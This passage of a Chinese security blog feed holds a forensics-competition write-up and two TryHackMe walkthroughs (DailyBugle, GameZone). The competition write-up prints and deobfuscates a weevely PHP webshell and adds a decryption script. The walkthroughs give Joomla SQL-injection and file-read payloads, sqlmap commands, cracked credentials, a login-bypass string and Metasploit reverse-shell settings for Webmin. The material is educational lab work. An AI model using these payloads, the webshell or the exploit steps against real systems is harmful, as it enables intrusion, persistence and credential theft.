[填空题]</h3><pre><code>分析网络流量包检材，攻击者电脑所使用的Python版本号是？（答案格式：1.1.1） (2分)</code></pre><pre><code>3.11.8</code></pre><p>直接搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292154526.png" alt="image-20241129215425388"></p><h3 id="13-填空题-1"><a href="#13-填空题-1" class="headerlink" title="13. [填空题]"></a>13. [填空题]</h3><pre><code>分析网络流量包检材，受害者服务器中网站所使用的框架结构是？（答案格式：thinkphp） (2分)</code></pre><pre><code>wordpress</code></pre><p>在反弹得到的shell中 看到有wordpress的源码和文件夹</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292150481.png" alt="image-20241129215041334"></p><h3 id="14-填空题-1"><a href="#14-填空题-1" class="headerlink" title="14. [填空题]"></a>14. [填空题]</h3><pre><code>分析网络流量包检材，攻击者获取到的数据库密码是？（答案格式：大小写按实际值填写） (4分)</code></pre><pre><code>sWfCsfJSPV9H3AmQzw8</code></pre><p>在下面读取了wp的配置文件 wp-config.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411292151844.png" alt="image-20241129215124761"></p><h3 id="15-填空题-1"><a href="#15-填空题-1" class="headerlink" title="15. [填空题]"></a>15. [填空题]</h3><pre><code>分析网络流量包检材，攻击者上传了一个weevely木马进行权限维持，上传时所使用的端口号为？（答案格式：3306） (2分)</code></pre><pre><code>2000</code></pre><p>在拿到shell后的流量包部分都是围绕help.php来进行传输信息的 猜测上传的木马就是help.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301049979.png" alt="image-20241130104913859"></p><p>在弹shell后面的一个包中找到了help.php的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301052257.png" alt="image-20241130105214122"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301052540.png" alt="image-20241130105228222"></p><pre><code>&lt;?php$q=&#39;uv1o2g6mkn7y&quot;;fv1unctiv1ov1n x(v1$t,$k)&#123;$c=v1strlen(v1$k)v1;v1$l=strlenv1($t);$o&#39;;$k=&#39;tents(v1&quot;php://iv1nput&quot;),$v1mv1)==1) &#123;@ov1b_start();v1@ev1val(@v1gzuncomv1press(@x(@&#39;;$A=&#39;$k=&quot;c6v1ae1ev170&quot;;$khv1=&quot;cbbf9v1691e009&quot;;v1$v1kv1f=&quot;85a8v19e92c410&quot;;$p=&quot;dv1zINv1Rg&#39;;$o=&#39;=&quot;v1&quot;;forv1($i=0;$v1iv1v1&lt;$l;)&#123;fv1v1or($j=0;($j&lt;$c&amp;&amp;$i&lt;$lv1);$j++,$i++)v1&#123;v1$o.=v1$t&#123;$i&#125;^&#39;;$D=str_replace(&#39;cM&#39;,&#39;&#39;,&#39;cMcreacMte_cMfcMunccMcMtion&#39;);$Q=&#39;$k&#123;$j&#125;v1v1;&#125;&#125;return v1$o;v1&#125;if (@pregv1_v1match(&quot;/v1$kh(.+)v1v1$kf/&quot;,@v1fv1ile_get_cov1n&#39;;$Z=&#39;leanv1();$r=@base6v14_ev1ncv1ode(v1@x(@gzcov1mpress($ov1),$v1kv1));printv1(&quot;$p$kh$r$kf&quot;);&#125;&#39;;$w=&#39;v1basev164_decodev1($mv1[v11]),$v1k)));$o=@ov1b_get_contev1nts(v1v1);@ob_env1d_c&#39;;$S=str_replace(&#39;v1&#39;,&#39;&#39;,$A.$q.$o.$Q.$k.$w.$Z);$C=$D(&#39;&#39;,$S);$C();?&gt;</code></pre><p>从流量包中看到应该是使用的2000端口来上传</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301054024.png" alt="image-20241130105359883"></p><h3 id="16-填空题-1"><a href="#16-填空题-1" class="headerlink" title="16. [填空题]"></a>16. [填空题]</h3><pre><code>分析网络流量包检材，攻击者上传了一个weevely木马进行权限维持，该木马第一次执行时获取到的缓冲区内容是？（答案格式：按实际值填写） (4分)</code></pre><pre><code>57638</code></pre><p> 下面就是需要解析一下这个混淆了的木马脚本了 参考<a href="https://blog.csdn.net/weixin_57567655/article/details/124510531">weevely的webshell分析以及冰蝎&#x2F;蚁剑免杀-PHP版_两重明文混淆webshell-CSDN博客</a></p><pre><code># 主要部分$D=str_replace(&#39;cM&#39;,&#39;&#39;,&#39;cMcreacMte_cMfcMunccMcMtion&#39;);$S=str_replace(&#39;v1&#39;,&#39;&#39;,$A.$q.$o.$Q.$k.$w.$Z);$C=$D(&#39;&#39;,$S);$C();</code></pre><p>$D参数将<code>cMcreacMte_cMfcMunccMcMtion</code>中所有的<code>cM</code>替换为空 也就是<code>create_function</code></p><p>$S参数将$A.$q.$o.$Q.$k.$w.$Z这七个参数内容中的<code>v1</code>替换为空 在进行拼接 </p><pre><code># 替换后的结果$q=&#39;uo2g6mkn7y&quot;;function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o&#39;;$k=&#39;tents(&quot;php://input&quot;),$m)==1) &#123;@ob_start();@eval(@gzuncompress(@x(@&#39;;$A=&#39;$k=&quot;c6ae1e70&quot;;$kh=&quot;cbbf9691e009&quot;;$kf=&quot;85a89e92c410&quot;;$p=&quot;dzINRg&#39;;$o=&#39;=&quot;&quot;;for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^&#39;;$Q=&#39;$k&#123;$j&#125;;&#125;&#125;return $o;&#125;if (@preg_match(&quot;/$kh(.+)$kf/&quot;,@file_get_con&#39;;$Z=&#39;lean();$r=@base64_encode(@x(@gzcompress($o),$k));print(&quot;$p$kh$r$kf&quot;);&#125;&#39;;$w=&#39;base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_c&#39;;</code></pre><p>拼接整理之后就是</p><pre><code class="php">&lt;?php $k=&quot;c6ae1e70&quot;;$kh=&quot;cbbf9691e009&quot;;$kf=&quot;85a89e92c410&quot;;$p=&quot;dzINRguo2g6mkn7y&quot;;function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o=&quot;&quot;;for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;if (@preg_match(&quot;/$kh(.+)$kf/&quot;,@file_get_contents(&quot;php://input&quot;),$m)==1&#123;@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print(&quot;$p$kh$r$kf&quot;);&#125;</code></pre><p>整理一下缩进</p><pre><code class="php">&lt;?php$k = &quot;c6ae1e70&quot;;       // 密钥k$kh = &quot;cbbf9691e009&quot;;  // 匹配开始标识符$kf = &quot;85a89e92c410&quot;;  // 匹配结束标识符$p = &quot;dzINRguo2g6mkn7y&quot;;     // 前缀标识符  // 定义 x() 函数，用于对字符串进行异或运算function x($t, $k)&#123;    $c = strlen($k);      $l = strlen($t);  // 输入字符串的长度    $o = &quot;&quot;;              // 遍历字符串 t 和 k，进行异或运算    for ($i = 0; $i &lt; $l;) &#123;        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;  // 异或操作，并拼接到输出字符串        &#125;    &#125;    return $o; &#125;if (@preg_match(&quot;/$kh(.+)$kf/&quot;, @file_get_contents(&quot;php://input&quot;), $m) == 1) &#123;    // 开始输出缓冲    @ob_start();    // 对解码后的数据进行解压缩并执行    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));    // 获取缓冲内容    $o = @ob_get_contents();    // 清空输出缓冲区    @ob_end_clean();    // 压缩输出内容并进行 base64 编码    $r = @base64_encode(@x(@gzcompress($o), $k));    print(&quot;$p$kh$r$kf&quot;);&#125;?&gt;</code></pre><p>写解密脚本</p><pre><code class="php">&lt;?php$k = &quot;c6ae1e70&quot;;       $kh = &quot;cbbf9691e009&quot;;  $kf = &quot;85a89e92c410&quot;;  $p = &quot;dzINRguo2g6mkn7y&quot;;        function x($t, $k)&#123;    $c = strlen($k);     $l = strlen($t);      $o = &quot;&quot;;    for ($i = 0; $i &lt; $l;) &#123;        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;         &#125;    &#125;    return $o; &#125;$encrypted_data = &#39;&#125;HWf-=PXe:&#123;?M .cbbf9691e009G6oqKP+t4ABWAVLT4dExMHs6Ylw85a89e92c410f_OUraaYXp_&amp;IVH4&#39;; if (preg_match(&quot;/$kh(.+)$kf/&quot;, $encrypted_data, $matches) == 1) &#123;    $encoded_data = $matches[1];     $decoded_data = base64_decode($encoded_data);    $decrypted_data = x($decoded_data, $k);    $uncompressed_data = @gzuncompress($decrypted_data);    echo($uncompressed_data); &#125;?</code></pre><p>找到第一个传输的加密流量包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301137231.png" alt="image-20241130113745092"></p><p>解密得到获取到的缓冲区内容是57638</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411301138992.png" alt="image-20241130113818067"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024第一届数证杯-计算机、手机、流量分析部分&quot;&gt;&lt;a href=&quot;#2024第一届数证杯-计算机、手机、流量分析部分&quot; class=&quot;headerlink&quot; title=&quot;2024第一届数证杯(计算机、手机、流量分析部分)&quot;&gt;&lt;/a&gt;2024第一届数证杯(计算</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-DailyBugle</title>
    <link href="http://w3nx1z1.github.io/posts/dea42128.html"/>
    <id>http://w3nx1z1.github.io/posts/dea42128.html</id>
    <published>2024-11-26T09:04:51.489Z</published>
    <updated>2025-02-14T08:30:17.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-DailyBugle"><a href="#Offensive-Pentesting-DailyBugle" class="headerlink" title="Offensive Pentesting-DailyBugle"></a>Offensive Pentesting-DailyBugle</h1><pre><code>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希并利用 yum 提升您的权限。</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre><code>nmap -T4 -sC -sV --script=vuln 10.10.46.209</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210914406.png" alt="image-20241121091426221"></p><p> 开放22 80 3306端口 其中80端口开放的网站服务是使用joomla框架搭建的</p><p>whatweb看一下 没啥有用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210949603.png" alt="image-20241121094938510"></p><p>joomla框架的话 用joomlascan扫一下 找到版本为3.7.0</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210950119.png" alt="image-20241121095047965"></p><p>What is the Joomla version?</p><pre><code>3.7.0</code></pre><p>然后访问一下网页 看到一则银行被抢劫的新闻 作案人是SpiderMan</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210946626.png" alt="image-20241121094648366"></p><p>Access the web server, who robbed the bank?</p><pre><code>SpiderMan</code></pre><p>其实在前面我们使用Joomlascan来扫描的时候 可以发现扫到了一个admin page</p><pre><code>[+] admin finder[++] Admin page : http://10.10.46.209//administrator</code></pre><p>访问一下 发现是后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411211959653.png" alt="image-20241121195913557"></p><p>到这里 信息搜集基本可以结束 </p><h2 id="Joomla3-7-0sql注入漏洞获取用户登陆密码"><a href="#Joomla3-7-0sql注入漏洞获取用户登陆密码" class="headerlink" title="Joomla3.7.0sql注入漏洞获取用户登陆密码"></a>Joomla3.7.0sql注入漏洞获取用户登陆密码</h2><p>类似的做法我们在DC-3中已经见过 使用sqlmap就可以做到</p><p><a href="https://w3nx1z1.github.io/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/">vulnhub靶场记录DC-3</a></p><p>直接看用法</p><pre><code>Using Sqlmap:sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p>上结果  查到表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><pre><code>[*] information_schema[*] joomla[*] mysql[*] performance_schema[*] test</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212002126.png" alt="image-20241121200217046"></p><p>继续在joomla数据库中注出数据表 我们这里需要的是<code>#__users</code>表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212003586.png" alt="image-20241121200306529"></p><p>在表中注出字段</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; --columns -p list[fullordering]</code></pre><p>我们需要的是username和password字段的值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212005451.png" alt="image-20241121200507384"></p><p>注出其中的值</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; -C &quot;username,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212006742.png" alt="image-20241121200634697"></p><h3 id="john爆破出jonah用户的密码明文"><a href="#john爆破出jonah用户的密码明文" class="headerlink" title="john爆破出jonah用户的密码明文"></a>john爆破出jonah用户的密码明文</h3><p>下面使用john来进行爆破</p><pre><code>echo $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm &gt;hash1.txtjohn --wordlist=rockyou.txt --user=jonah hash1.txt</code></pre><p>爆破出是spiderman123</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212008740.png" alt="image-20241121200803685"></p><p>使用jonah&#x2F;spiderman123成功登陆网站后台</p><h2 id="靶机shell"><a href="#靶机shell" class="headerlink" title="靶机shell"></a>靶机shell</h2><h3 id="任意文件读取-一个小利用-但是在这里不是很方便"><a href="#任意文件读取-一个小利用-但是在这里不是很方便" class="headerlink" title="任意文件读取(一个小利用 但是在这里不是很方便)"></a>任意文件读取(一个小利用 但是在这里不是很方便)</h3><p>其实joomla3.7.0也是可以利用sqli进行任意文件读取的 这里放几个payload 将想读的文件的绝对路径转hex就行</p><p>正常读  读第一行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,load_file(0x2f6574632f706173737764)),1)</code></pre><p>读正数第N行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,N),0x0a,-1)),1)</code></pre><p>读倒数第N行(因为他这个情况下只能显示出来一行)</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,-N+1),0x0a,1)),1)</code></pre><p>这里成功读到倒数第三行的靶机中另一个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212137163.png" alt="image-20241121213753065"></p><p>后面还可以继续读<code>/var/www/html/configuration.php</code>这里面有jjameson用户的登陆密码 再通过ssh的方式拿到shell 但是这里文件读取有行数和每行字数的限制 都不全 所以也不行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212148477.png" alt="image-20241121214840418"></p><h3 id="另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去"><a href="#另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去" class="headerlink" title="另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去"></a>另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去</h3><p>这个方式我们在DC-3的时候是可以成功利用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212144145.png" alt="image-20241121214445084"></p><h3 id="sql注入读文件拿到登陆密码"><a href="#sql注入读文件拿到登陆密码" class="headerlink" title="sql注入读文件拿到登陆密码"></a>sql注入读文件拿到登陆密码</h3><pre><code>sqlmap -u &quot;http://10.10.67.113/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E --file-read /var/www/html/configuration.php --batch</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212149708.png" alt="image-20241121214932637"></p><pre><code>nv5uz9r3ZEDzVjNu</code></pre><p>直接ssh连</p><pre><code>ssh jjameson@10.10.67.113 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212151142.png" alt="image-20241121215144074"></p><h3 id="修改模板代码进行反弹shell"><a href="#修改模板代码进行反弹shell" class="headerlink" title="修改模板代码进行反弹shell"></a>修改模板代码进行反弹shell</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212152691.png" alt="image-20241121215255610"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212153939.png" alt="image-20241121215314878"></p><h2 id="yum提权"><a href="#yum提权" class="headerlink" title="yum提权"></a>yum提权</h2><p>先看suid</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154134.png" alt="image-20241121215422085"></p><p>有su和sudo 但是很可惜这里用不了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154805.png" alt="image-20241121215452760"></p><p>再看有root权限的命令</p><pre><code>sudo -l</code></pre><p>发现yum可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156030.png" alt="image-20241121215600967"></p><p>直接在<a href="https://gtfobins.github.io/">GTFOBins</a>上面 找到利用方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156003.png" alt="image-20241121215653950"></p><p>照着打就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212157382.png" alt="image-20241121215719315"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Joomla3.7.0 sql注入拿到后台登陆密码</p><p>2.修改模板代码反弹shell</p><p>3.sql注入拿用户密码</p><p>4.yum提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-DailyBugle&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-DailyBugle&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-DailyBugl</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-GameZone</title>
    <link href="http://w3nx1z1.github.io/posts/dda9dc81.html"/>
    <id>http://w3nx1z1.github.io/posts/dda9dc81.html</id>
    <published>2024-11-26T09:04:48.797Z</published>
    <updated>2025-02-14T08:30:17.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-GameZone"><a href="#Offensive-Pentesting-GameZone" class="headerlink" title="Offensive Pentesting-GameZone"></a>Offensive Pentesting-GameZone</h1><h2 id="Deploy-the-vulnerable-machine"><a href="#Deploy-the-vulnerable-machine" class="headerlink" title="Deploy the vulnerable machine"></a>Deploy the vulnerable machine</h2><p>拿到靶机 先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172254919.png" alt="image-20241117225437774"></p><p>只是开启了22端口的ssh服务和80端口的web服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172301781.png" alt="image-20241117230136420"></p><p>访问一下网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172310906.png" alt="image-20241117231042730"></p><p>What is the name of the large cartoon avatar holding a sniper on the forum?</p><pre><code>Agent 47</code></pre><p>问的是背景中这个拿着狙击枪的角色是 我们把这张图单独保存出来 百度识图一下得知是《杀手》游戏中的主角</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172314464.png" alt="image-20241117231439353"></p><h2 id="Obtain-access-via-SQLi"><a href="#Obtain-access-via-SQLi" class="headerlink" title="Obtain access via SQLi"></a>Obtain access via SQLi</h2><p>SQL 是一种用于在数据库中存储、编辑和检索数据的标准语言。查询可能如下所示：</p><pre><code>SELECT * FROM users WHERE username = :username AND password := password</code></pre><p>在我们的 GameZone 机器中，当您尝试登录时，它将从您的用户名和密码中获取您输入的值，然后将它们直接插入到上面的查询中。如果查询找到数据，您将被允许登录，否则它将显示一条错误消息。</p><p>这是一个潜在的漏洞位置，因为您可以将用户名输入为另一个 SQL 查询。这将写入、放置和执行查询。</p><p>让我们使用上面学到的知识来操作查询并在没有任何合法凭证的情况下登录。</p><p>如果我们的用户名是 admin，密码是： <code>&#39; or 1=1 -- -</code>它会将其插入到查询中并验证我们的会话。</p><p>现在在 Web 服务器上执行的 SQL 查询如下所示：</p><pre><code>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</code></pre><p>我们作为密码输入的额外 SQL 更改了上述查询以中断初始查询并继续（与管理员用户一起）如果 1&#x3D;&#x3D;1，则注释查询的其余部分以阻止它中断。</p><p>完成</p><p>GameZone 在数据库中没有管理员用户，但是您仍然可以使用我们在上一个问题中使用的输入密码数据在不知道任何凭据的情况下登录。</p><p>使用 <code>&#39; or 1=1 -- -</code> 作为您的用户名，并将密码留空</p><p>登录后，您将重定向到哪个页面？</p><pre><code>portal.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135932.png" alt="image-20241118113525822"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135714.png" alt="image-20241118113538644"></p><h2 id="Using-SQLMap"><a href="#Using-SQLMap" class="headerlink" title="Using SQLMap"></a>Using SQLMap</h2><p>重定向到的这个页面是一个游戏评论查询的功能 我们可以在这个页面上进行sql注入 这里直接使用sqlmap</p><p>先用burpsuite把请求包拦一下 将请求包的内容保存到requests.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181152184.png" alt="image-20241118115229127"></p><pre><code>sqlmap -r requests.txt --dbms=mysql --dump</code></pre><p>使用–dbms指定数据库的类型 –dump直接转储数据库表项,查询字段值 </p><p>输出了db数据库中的两个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154640.png" alt="image-20241118115453573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154331.png" alt="image-20241118115457279"></p><p>在 users 表中，哈希密码是什么？</p><pre><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></pre><p>与哈希密码关联的用户名是什么？</p><pre><code>agent47</code></pre><p>另一个表名是什么？</p><pre><code>post</code></pre><h2 id="Cracking-a-password-with-JohnTheRipper"><a href="#Cracking-a-password-with-JohnTheRipper" class="headerlink" title="Cracking a password with JohnTheRipper"></a>Cracking a password with JohnTheRipper</h2><p>下一步我们使用john来爆破密码</p><pre><code>john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181157277.png" alt="image-20241118115759212"></p><p>拿到密码明文是</p><pre><code>videogamer124</code></pre><p>有了用户名和密码 我们可以使用ssh远程连接 获取agent47用户的shell 并拿到用户目录下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181159788.png" alt="image-20241118115914731"></p><p>什么是用户标志？</p><pre><code>649ac17b1480ac13ef1e4fa579dac95c</code></pre><h2 id="Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务"><a href="#Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务" class="headerlink" title="Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)"></a>Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)</h2><p>反向 SSH 端口转发将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p><p><strong>-L</strong> 是本地隧道 （YOU &lt;– CLIENT）。如果站点被阻止，您可以将流量转发到您拥有的服务器并查看它。例如，如果你在本地访问远程服务器开启的网页被拒绝时，您可以执行</p><pre><code>ssh -L 9000:imgur.com:80 user@example.com</code></pre><p>转到您计算机上的 localhost:9000，将使用您的其他服务器加载这个远程服务器的服务流量。</p><p><strong>-R</strong> 是远程隧道 （YOU –&gt; CLIENT）。您将流量转发到其他服务器供其他人查看。与上面的示例类似，但是相反</p><pre><code>我们将使用一个名为 ss 的工具来调查主机上运行的sockets如果我们运行 ss -tulpn，它会告诉我们正在运行哪些sockets连接</code></pre><table><thead><tr><th><strong>Argument</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>-t</td><td>Display TCP sockets</td></tr><tr><td>-u</td><td>Display UDP sockets</td></tr><tr><td>-l</td><td>Displays only listening sockets</td></tr><tr><td>-p</td><td>Shows the process using the socket</td></tr><tr><td>-n</td><td>Doesn’t resolve service names</td></tr></tbody></table><p>现在我们可以在靶机中运行一下这个命令 查看一下有多少TCP的sockets在运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181648577.png" alt="image-20241118164804514"></p><p>How many TCP sockets are running?</p><pre><code>5</code></pre><p>我们可以看到，运行在端口 10000 上的服务被防火墙规则从外部阻止了（我们可以从 IPtable 列表中看到这一点）。但是，使用 SSH 隧道，我们可以将端口公开给我们（本地）</p><pre><code>sudo iptables -L -n -v</code></pre><p>在本地 我们运行 这样10.10.137.213开放的端口10000的服务就会转发到我们本地的10000端口上</p><pre><code>ssh -L 10000:localhost:10000 agent47@10.10.137.213</code></pre><p>现在访问<code>localhost:10000</code> 就可以访问到这个web服务 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181657049.png" alt="image-20241118165732947"></p><p>尝试发现 网站的登陆密码也是agent47&#x2F;videogamer124 成功登陆后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181658156.png" alt="image-20241118165808082"></p><p>What is the name of the exposed CMS?</p><pre><code>Webmin</code></pre><p>What is the CMS version?</p><pre><code>1.580</code></pre><h2 id="Privilege-Escalation-with-Metasploit"><a href="#Privilege-Escalation-with-Metasploit" class="headerlink" title="Privilege Escalation with Metasploit"></a>Privilege Escalation with Metasploit</h2><p>有了cms的版本 我们直接使用msfconsole来提权 这里就直接使用第一个payload来自动提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181659845.png" alt="image-20241118165954787"></p><p>需要提前设置的条件有</p><pre><code>use 0set payload cmd/unix/reverseset RHOSTS localhostset RPOST 10000set PASSWORD videogamer124set USERNAME agent47set LHOST 10.11.114.143set ssl false</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181700941.png" alt="image-20241118170035861"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181707215.png" alt="image-20241118170727069"></p><p>已经创建了一个session会话 直接打开</p><pre><code>sessions -lsessions 1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181708778.png" alt="image-20241118170859673"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.sql注入重定向</p><p>2.sqlmap注出数据库中的账密信息</p><p>3.john破解密码哈希</p><p>4.反向ssh隧道端口转发</p><p>5.Webmin 1.580漏洞 msfconsole提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-GameZone&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-GameZone&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-GameZone&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Kenobi</title>
    <link href="http://w3nx1z1.github.io/posts/77f3502a.html"/>
    <id>http://w3nx1z1.github.io/posts/77f3502a.html</id>
    <published>2024-11-26T09:04:45.988Z</published>
    <updated>2025-02-14T08:30:17.426Z</updated>
    
